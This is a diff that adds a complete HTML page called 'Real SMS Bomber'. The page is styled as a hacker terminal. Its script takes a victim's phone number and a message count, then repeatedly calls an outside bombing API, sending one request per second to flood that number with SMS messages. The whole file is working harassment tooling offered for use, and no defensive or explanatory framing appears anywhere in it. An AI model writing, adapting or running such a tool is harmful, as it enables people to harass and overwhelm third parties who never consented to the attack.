@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SMS Bomber</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding: 20px;
+    }
+    input, button {
+      padding: 10px;
+      font-size: 18px;
+      margin: 10px;
+      border: none;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #0f0;
+      color: #000;
+      cursor: pointer;
+    }
+    #log {
+      margin-top: 20px;
+      text-align: left;
+      max-height: 300px;
+      overflow-y: auto;
+      padding: 10px;
+      background-color: #000;
+      border: 1px solid #0f0;
+    }
+    #error {
+      color: red;
+    }
+    #success {
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <h1>Real SMS Bomber</h1>
+  <input type="text" id="number" placeholder="Enter phone number" />
+  <input type="number" id="quantity" placeholder="Enter quantity (e.g., 5)" />
+  <button onclick="startBombing()">Start Bombing</button>
+  <div id="log"></div>
+  <div id="error"></div>
+  <div id="success"></div>
+
+  <script>
+    async function startBombing() {
+      const number = document.getElementById("number").value;
+      const quantity = document.getElementById("quantity").value;
+      const logDiv = document.getElementById("log");
+      const errorDiv = document.getElementById("error");
+      const successDiv = document.getElementById("success");
+
+      // Clear previous messages
+      logDiv.innerHTML = "";
+      errorDiv.innerHTML = "";
+      successDiv.innerHTML = "";
+
+      if (!number || !quantity) {
+        errorDiv.innerHTML = "Please enter both phone number and quantity!";
+        return;
+      }
+
+      errorDiv.innerHTML = "";
+      successDiv.innerHTML = "";
+
+      logDiv.innerHTML = `Starting bombing on ${number}...<br><br>`;
+
+      let i = 0;
+      const interval = setInterval(async () => {
+        if (i >= quantity) {
+          logDiv.innerHTML += `<br><b>Bombing completed on ${number}!</b>`;
+          successDiv.innerHTML = `Successfully bombed ${quantity} messages to ${number}.`;
+          clearInterval(interval);
+          return;
+        }
+
+        try {
+          // Send GET request to your real API
+          const response = await fetch(`https://www.noobs-api.rf.gd/dipto/bomber?number=${number}&limit=1`);
+          
+          // Check if the response was successful
+          if (response.ok) {
+            logDiv.innerHTML += `Message #${i + 1}: SMS sent to ${number}.<br>`;
+          } else {
+            logDiv.innerHTML += `Error: Could not send message #${i + 1}.<br>`;
+          }
+        } catch (error) {
+          logDiv.innerHTML += `Error: ${error.message} <br>`;
+        }
+
+        logDiv.scrollTop = logDiv.scrollHeight;
+        i++;
+      }, 1000); // Request interval for real SMS bombing
+    }
+  </script>
+</body>
+</html>
